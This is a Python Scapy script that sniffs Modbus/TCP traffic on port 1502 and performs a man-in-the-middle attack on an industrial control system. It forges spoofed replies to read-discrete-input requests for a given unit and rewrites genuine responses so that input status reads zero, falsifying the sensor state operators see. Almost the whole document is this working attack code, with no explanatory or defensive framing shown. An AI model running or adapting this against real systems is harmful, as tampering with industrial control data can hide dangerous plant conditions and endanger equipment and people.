from scapy.all import *
from scapy.sendrecv import send
from scapy.layers.inet import TCP, IP


slave_id = 5
discrete_input_address = 15
transaction_ids = set()


def modify_modbus_packet(pck):
    global transaction_ids

    if TCP in pck:
        foo = pck[TCP].payload
        payload = bytes(pck[TCP].payload)
        foo
        if len(payload) < 8:
            return None

        function_code = payload[7]

        if pck[TCP].dport == 1502:
            unit_id = payload[6]
            transaction_id = payload[0:2]
            if function_code == 2 and unit_id == slave_id:
                start_address = (payload[8] << 8) + payload[9]
                quantity = (payload[10] << 8) + payload[11]
                if start_address <= discrete_input_address < start_address + quantity:
                    transaction_ids.add(transaction_id)
                    answer = pck.copy()
                    answer[TCP].dport = pck[TCP].sport
                    answer[TCP].sport = pck[TCP].dport
                    answer[IP].src = pck[IP].dst
                    answer[IP].dst = pck[IP].src
                    sequence = b'\x00\x00\x00\x04\x05\x02\x01\x01'
                    answer_payload = transaction_id + sequence
                    # b'\x00\x01\x00\x00\x00\x04\x05\x02\x01\x00'
                    answer[TCP].payload = Raw(load=answer_payload)
                    print("Answer: \n", answer.show(dump=True))
                    send(answer, iface="eth0")
            send(pck, iface="eth0")
        elif pck[TCP].sport == 1502:
            transaction_id = payload[0:2]
            if transaction_id in transaction_ids:
                # transaction_ids.remove(transaction_id)
                byte_count = payload[8]
                input_status = payload[9:9 + byte_count]

                if input_status != b'\x00':
                    payload = payload[:9] + bytes([0]) + payload[10:]
                    pck[TCP].payload = Raw(load=payload)

                    # Recalcule les checksums
                    # del pck[IP].chksum
                    # del pck[TCP].chksum
                    sendp(pck, iface="eth0")
                    # print("modified packet: \n", pck.show(dump=True))
                    return 1
            send(pck, iface="eth0")

    return None


def packet_callback(p):
    modified_packet = modify_modbus_packet(p)
    # if modified_packet:
    # print("Packet modified")
    # send(IP(dst='192.168.42.42') / TCP(dport=1502, flags='S'), iface="eth0")
    # else:
    # print("original packet")


sniff(filter="tcp port 1502", prn=packet_callback, store=0, iface="eth0")
